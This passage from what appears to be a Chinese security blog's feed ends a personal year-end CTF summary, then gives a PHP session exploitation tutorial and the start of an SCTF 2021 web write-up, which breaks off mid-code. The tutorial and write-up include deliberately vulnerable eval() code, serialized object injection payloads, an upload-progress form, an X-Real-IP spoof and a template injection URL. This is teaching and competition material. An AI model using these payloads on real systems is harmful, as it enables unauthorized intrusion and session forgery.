title="六月"></a>六月</h2><p>这个月第一次去参加了线下的交流论坛吧，感觉自己也算是个学习人了，也是第一次去西电，学校挺大，会议室挺敞亮。这次收获最大的可能是见到了一个安全界大牛<code>杨卿</code>，而且也和伙伴们一起聚了餐，我们的团队越来越大了！这个月通过面试也成为了网安院特长班的一员（现在都快把这事给忘了…</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412410.png" alt="image-20211231131659552"></p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412410-165150893348112.png" alt="image-20211231131659552"></p><h2 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h2><p>这个月前中期又是有压力的考试周，一周创造奇迹，然后最后考试险过。考完试后想要暑假留校，但是学院这边申请没有通过（其他院的伙伴们都成功申请了），没办法，先回家等待时机再回到学校。当时已经准备自己办个比赛，在想名字，在学习如何搭建靶场，这个月好像没啥重要的事情。</p><h2 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h2><p>这个月初溜回了学校，但是呆了一周多一点因为西安疫情和全运会的原因被迫又返家，一个暑假来回走了两趟，每次火车5个多小时，简直折磨人。期间在家学不进去，不是在水群就是在捣鼓ctfd靶场环境，返校的那段时间认识了信安实验室的大四学长，那段时间聊了很多，学长也给了我很多启发，现在想想虽然那个暑假挺曲折的，但是返校的那段时间还是有很多收获的。月底就开学了，经过暑假的捣鼓，靶场环境也基本完善，就等待着新大一踊跃参加了，当时水群也让更多的学弟学妹认识到了网络科技协会，认识到了ctf比赛。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412412.png" alt="image-20211231132657213"></p><h2 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h2><p>第一次办比赛，题目也出好了，迫不及待地想让大家来参加，也是第一次体会到当出题人的愉悦感，这次办比赛也收获了很多，赛前的宣传，还有qq群的答题自动播报，还有各种发公告的官方话。</p><p>月底被<code>wawyw</code>大佬的邀请去了西部云安全峰会，还有大佬请吃饭，那家自助小火锅是真的不错，没有照片真是可惜了。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311412413.png" alt="image-20211231133154740"></p><h2 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h2><p>这个月被学长带，参与了校赛的web出题人，这让我特别的有成就感，并且实验室的其他三名伙伴组队在比赛中斩获一等奖，这算是今年一年来最有意义的事情了吧。之后学长们还弄了自己的社团<code>A&amp;D网络安全协会</code>，一切都慢慢好了起来。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311430372.png" alt="image-20211231133516436"></p><p>还有就是这个月<code>网络科技协会</code>迎来了新一级的纳新，感觉时间过的好快，自己还懵懵懂懂就要开始像学长一样带学弟学妹了，这个时候越发感觉到时间流失之快，觉得自己还是不够努力。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311430292.png" alt="image-20211231134143979"></p><h2 id="十一月"><a href="#十一月" class="headerlink" title="十一月"></a>十一月</h2><p>学长们创建起了校队<code>Gleaf</code>，很荣幸自己可以成为其中的一员，希望我们的队伍可以越来越好。学了这么久了还没有参加过线下的比赛，最接近的一次还是今年的<code>长安杯</code>，也是我解出<code>web</code>题最多的一次，但是听说这次的题也都很简单，我还是有很长的路要走。无照片…</p><h2 id="十二月"><a href="#十二月" class="headerlink" title="十二月"></a>十二月</h2><p>时间好快，这么快就到了十二月，开始投简历，想要找个实习或者联合战队让自己提升提升，过程中学会了简历如何去写，也更加坚定了自己要好好通过打比赛来提升自己的实力。</p><p>感谢<code>tacooooo</code>马总带我代打，让我通过自己的能力挣到第一笔小钱。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311430389.png" alt="image-20211231134936349"></p><p>22号因为疫情开始制动隔离，要开始习惯于在宿舍学习了，前几天面试<code>ChMd5</code>竟然过了，让我兴奋不已，以后一定要更加努力，不然打不出成绩就太丢人了。</p><p><img src="/post/2021-12/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/202112311431780.png" alt="image-20211231135257077"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>21年有过很多迷茫，有过很多坎坷，到现在我可能知道了自己想要的是什么了，可能也算是入了安全的门，希望之后的22年可以开始突破自我，通过自己的实力打进线下赛，打出成绩，现在还是太菜，隔离期间呆宿舍做那种简单题找快感一点提升都没有。</p><p>22年加油，希望<code>网络科技协会</code>越来越好，希望<code>Gleaf</code>越来越好，希望<code>A&amp;D网络安全协会</code>越来越好！</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Session利用总结</title>
      <link href="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-Session-简介"><a href="#PHP-Session-简介" class="headerlink" title="PHP-Session 简介"></a>PHP-Session 简介</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><code>session</code>一般称作会话控制，<code>session</code>对象存储特定用户会话所需的属性及配置信息。</p><p>我自己的理解来说：<code>PHP session</code>是一个特殊的变量，它存储着我们与服务器会话的全部信息，该信息在PHP中一般是以文件在服务器中存储，服务器会为每个访问者创建一个<code>id</code>一般为<code>PHPSESSID</code>，这个id在请求时存储在<code>cookie</code>中，用于服务器识别用户身份。</p><h2 id="会话流程"><a href="#会话流程" class="headerlink" title="会话流程"></a>会话流程</h2><p>当你开始一个会话时，<code>PHP</code>会尝试从请求中查找会话<code>ID</code>（也就是<code>cookie</code>中的<code>PHPSESSID</code>)，如果请求中不存在该<code>ID</code>信息，<code>PHP</code>就会创建一个新的会话，并以<code>Set-Cookie</code>响应头发送给用户<code>ID</code>。会话开始之后，<code>PHP</code>就会将会话中的一些数据存到<code>$_SESSION</code>变量中，当<code>PHP</code>停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化并发送给会话保存管理器进行保存。</p><p>可以通过调用函数<code>session_start()</code>手动开始一个会话。如果配置项<code>session.auto_start</code>设置为1，那么请求开始的时候，会话会自动开始。</p><p><code>PHP</code>脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话。</p><h2 id="常见配置"><a href="#常见配置" class="headerlink" title="常见配置"></a>常见配置</h2><p>在<code>PHP</code>的安装目录下找到<code>php.ini</code>文件，这个文件主要的作用是对<code>PHP</code>进行一些配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.save_handler</span> = files <span class="comment">#session的存储方式</span></span><br><span class="line"><span class="attr">session.save_path</span> = <span class="string">&quot;/var/lib/php/session&quot;</span> <span class="comment">#session id存放路径</span></span><br><span class="line"><span class="attr">session.use_cookies</span>= <span class="number">1</span> <span class="comment">#使用cookies在客户端保存会话</span></span><br><span class="line"><span class="attr">session.use_only_cookies</span> = <span class="number">1</span> <span class="comment">#去保护URL中传送session id的用户</span></span><br><span class="line"><span class="attr">session.name</span> = PHPSESSID <span class="comment">#session名称（默认PHPSESSID）</span></span><br><span class="line"><span class="attr">session.auto_start</span> = <span class="number">0</span> <span class="comment">#不启用请求自动初始化session</span></span><br><span class="line"><span class="attr">session.use_trans_sid</span> = <span class="number">0</span>  <span class="comment">#如果客户端禁用了cookie，可以通过设置session.use_trans_sid来使标识的交互方式从cookie变为url传递</span></span><br><span class="line"><span class="attr">session.cookie_lifetime</span> = <span class="number">0</span> <span class="comment">#cookie存活时间（0为直至浏览器重启，单位秒）</span></span><br><span class="line"><span class="attr">session.cookie_path</span> = / <span class="comment">#cookie的有效路径</span></span><br><span class="line">session.cookie_domain = <span class="comment">#cookie的有效域名</span></span><br><span class="line">session.cookie_httponly = <span class="comment">#httponly标记增加到cookie上(脚本语言无法抓取)</span></span><br><span class="line"><span class="attr">session.serialize_handler</span> = php <span class="comment">#PHP标准序列化</span></span><br><span class="line"><span class="attr">session.gc_maxlifetime</span> =<span class="number">1440</span> <span class="comment">#过期时间(默认24分钟，单位秒)</span></span><br></pre></td></tr></table></figure><h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p><code>PHP</code>中的<code>session</code>内容默认是以文件的方式来存储的，存储方式由配置项<code>session.save_handler</code>来确定。存储文件是以<code>sess_PHPSESSID</code>来命名的，文件内容就是<code>$_SESSION</code>值得序列化内容。</p><p><code>session.serialize_handler</code> 配置项是用来设置<code>$_SESSION</code>序列化引擎得，在<code>php&gt;5.5.4</code>后默认是以<code>php</code>引擎进行序列得，除了该方式，还有其他引擎，不同得引擎所序列化的内容不同，也就是存储的内容不同。</p><table><thead><tr><th>存储引擎</th><th>存储方式</th></tr></thead><tbody><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符+键名+经过 serialize() 函数序列化处理的值</td></tr><tr><td>php</td><td>键名+竖线+经过 serialize() 函数序列处理的值</td></tr><tr><td>php_serialize</td><td>(PHP&gt;5.5.4) 经过 serialize() 函数序列化处理的数组</td></tr></tbody></table><p>在使用<code>PHP</code>的时候如果想要修改为其他的引擎，我们可以添加代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;需要设置的引擎&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们在存储的时候也可以使用<code>session_start([&quot;serialize_handler&quot;=&gt;&quot;引擎&quot;])</code>来以该引擎创建<code>session</code>(<code>PHP7</code>以后出现)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session_start(<span class="keyword">array</span> `<span class="variable">$options</span>` = <span class="keyword">array</span>()): <span class="keyword">bool</span></span><br><span class="line"><span class="comment"># 此参数是一个关联数组，如果提供，那么会用其中的项目覆盖 会话配置指示 中的配置项。此数组中的键无需包含 session. 前缀。</span></span><br></pre></td></tr></table></figure><h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start([<span class="string">&quot;serialize_handler&quot;</span>=&gt;<span class="string">&quot;php_binary&quot;</span>]);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;seizer&quot;</span>]=<span class="string">&quot;Hello ggbond&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/202112302215555.png" alt="image-20211230142238257"></p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start([<span class="string">&quot;serialize_handler&quot;</span>=&gt;<span class="string">&quot;php&quot;</span>]);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;seizer&quot;</span>]=<span class="string">&quot;Hello ggbond&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/202112302215290.png" alt="image-20211230142311136"></p><h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start([<span class="string">&quot;serialize_handler&quot;</span>=&gt;<span class="string">&quot;php_serialize&quot;</span>]);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;seizer&quot;</span>]=<span class="string">&quot;Hello ggbond&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/202112302216323.png" alt="image-20211230142046779"></p><h1 id="PHP-Session利用"><a href="#PHP-Session利用" class="headerlink" title="PHP-Session利用"></a>PHP-Session利用</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用条件：存在文件包含，<code>session</code>文件的路径已知，且文件内容可控。</p><p><code>session</code>文件的路径可从<code>phpinfo</code>中的<code>session.save_path</code>可知，或者猜测路径</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_PHPSESSIONID</span><br><span class="line">/var/lib/php[\d]/sessions/sess_PHPSESSIONID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>然后通过写入内容并包含<code>session</code>文件即可获得flag，<code>session</code>文件名一般为<code>sess_PHPSESSID</code></p><p>如果<code>php</code>设置了<code>open_basedir</code>，限制了我们读取文件的范围，我们就算得知了<code>session</code>文件的存储路径，但是不在我们的读取范围里，这里可以考虑修改一下<code>session</code>文件存储的位置。</p><p>我们可以通过<code>session_start()</code>的<code>options</code>参数进行覆盖<code>php.ini</code>的配置<code>session.save_path</code>来修改保存路径，然后再进行文件包含。当然这个操作也可以通过<code>session_save_path()</code>函数完成。</p><h2 id="用户伪造"><a href="#用户伪造" class="headerlink" title="用户伪造"></a>用户伪造</h2><p>利用条件：已知<code>PHP</code>所使用的<code>session</code>存储引擎，以及<code>session</code>文件的内容可控。</p><p>通过已知的存储引擎，我们通过构造<code>session</code>文件，并将其上传到<code>session</code>文件存储的位置，即可通过该<code>PHPSESSID</code>进行访问网站</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>当网站序列化存储 <code>session</code> 与反序列化读取 <code>session</code> 的方式不同时，就可能导致 <code>session</code> 反序列化漏洞的产生。 一般都是以 <code>php_serialize</code> 序列化存储 <code>session</code>， 以 <code>PHP</code> 反序列化读取 <code>session</code>，造成反序列化攻击。或者是可以通过序列化某些可利用方法进行构造<code>pop链</code>进行反序列化攻击。</p><h3 id="有-SESSION赋值"><a href="#有-SESSION赋值" class="headerlink" title="有$_SESSION赋值"></a>有<code>$_SESSION</code>赋值</h3><p>举例：</p><p>demo1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;u&quot;</span>];</span><br></pre></td></tr></table></figure><p>demo2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$var</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>demo1.php</code>和<code>demo2.php</code>使用了不同的存储引擎，所以在进行序列化和反序列化的过程中可能会存在逃逸从而导致反序列化攻击</p><p>for example：</p><p>我们给<code>demo1.php</code>传入如下的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br><span class="line">php_serialize序列化后=&gt;</span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">47</span>:<span class="string">&quot;|O:7:&quot;</span>session<span class="string">&quot;:1:&#123;s:3:&quot;</span><span class="keyword">var</span><span class="string">&quot;;s:10:&quot;</span>phpinfo();<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>接下来<code>demo2.php</code>使用<code>php</code>存储引擎来反序列化，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">47</span>:<span class="string">&quot;|O:7:&quot;</span>session<span class="string">&quot;:1:&#123;s:3:&quot;</span><span class="keyword">var</span><span class="string">&quot;;s:10:&quot;</span>phpinfo();<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">php反序列化后=&gt;</span><br><span class="line">[<span class="string">&#x27;a:1:&#123;s:8:&quot;username&quot;;s:47:&quot;&#x27;</span>=&gt;<span class="string">&#x27;O:7:&quot;session&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>细心的童鞋会发现，在反序列化的过程中难道不会报错吗？这里提到一个<code>unserialize</code> 的特性，在执行<code>unserialize</code> 的时候，如果字符串前面满足了可被反序列化的规则即后续的不规则字符会被忽略。</p><h3 id="无-SESSION赋值"><a href="#无-SESSION赋值" class="headerlink" title="无$_SESSION赋值"></a>无<code>$_SESSION</code>赋值</h3><p><code>PHP</code>还存在一个<code>upload_porcess</code>机制，可以在<code>$_SESSION</code>中创建一个键值对，其中的值可控。</p><p><img src="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/202112302216431.png" alt="image-20211230214227455"></p><p>以 Jarvis OJ 平台的 PHPINFO 题目为例，环境地址：<a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过查看<code>phpinfo</code>，需要知道<code>session.upload_process.enabled</code>配置项为<code>On</code>，并且具有存储引擎差异，我们就可以利用这一特性。</p><p>查看<code>session.upload_progress.name</code>字段获得变量名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>，我们可以在本地创建一个<code>form.html</code>提交表单。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>bp</code>抓包,在 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的 <code>value</code> 值123后面添加<code>|</code> 和序列化的字符串</p><p><img src="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/202112302216561.png" alt="image-20211230220004788"></p><p>或者可以使用<code>postman</code>进行传参</p><p><img src="/post/2021-12/PHP-Session%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/202112302216645.png" alt="image-20211230220031024"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>利用条件：<code>session</code>文件存储路径已知且可以上传，有可利用的反序列化攻击链，最近刚刚打过的<code>SCTF2021</code>中<code>upload_it</code>就是该题型</p><p>传送门：<a href="https://seizer.top/post/2021-12/SCTF2021/">SCTF2021</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 身份认证 </tag>
            
            <tag> Session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF 2021</title>
      <link href="/post/2021-12/SCTF2021/"/>
      <url>/post/2021-12/SCTF2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Loginme"><a href="#Loginme" class="headerlink" title="Loginme"></a>Loginme</h2><p>有源码，没学过go，瞎看<code>middleware.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> middleware</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LocalRequired</span><span class="params">()</span> <span class="title">gin</span>.<span class="title">HandlerFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> c.GetHeader(<span class="string">&quot;x-forwarded-for&quot;</span>) != <span class="string">&quot;&quot;</span> || c.GetHeader(<span class="string">&quot;x-client-ip&quot;</span>) != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">c.AbortWithStatus(<span class="number">403</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ip := c.ClientIP()</span><br><span class="line"><span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.1&quot;</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.AbortWithStatus(<span class="number">401</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是需要<code>伪造ip</code>，但不能使用<code>x-forwarded-for</code>和<code>x-client-ip</code>，我们尝试使用<code>x-remote-ip</code>和<code>x-real-ip</code>，使用<code>x-real-ip</code>成功伪造<code>127.0.0.1</code></p><p>然后查看<code>route.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">idString, flag := c.GetQuery(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">·····</span><br><span class="line">age := TargetUser.Age</span><br><span class="line"><span class="keyword">if</span> age == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">age, flag = c.GetQuery(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">age = <span class="string">&quot;forever 18 (Tell me the age)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">······</span><br><span class="line">html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">······</span><br><span class="line">tmpl.Execute(c.Writer, TargetUser)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码我只将重要部分写了出来，这里使用了<code>fmt.Sprintf</code>格式化字符串，与之前学过的<code>flask</code>框架相似，使用格式化字符串可能会出现<code>SSTI</code>，这里将<code>age</code>渲染到了页面里，而且如果<code>age</code>在所输入的用户<code>id</code>中不存在的话，<code>age</code>是可控的，所以就导致了<code>SSTI</code>，简单查看了一下，发现了<code>&#123;&#123;.msg&#125;&#125;</code>大致就知道该如何注入了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://124.71.166.197:18001/admin/index?id=0&amp;age=&#123;&#123;.Password&#125;&#125;</span><br><span class="line">Header X-real-IP:127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload_it"></a>Upload_it</h2><p>只有一个文件上传的点，经过多次上传发现目录只能穿越到<code>/tmp</code>，然后应该就只能想到 <code>session</code>相关的知识点了，</p><p>然后发现给了<code>composer.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span 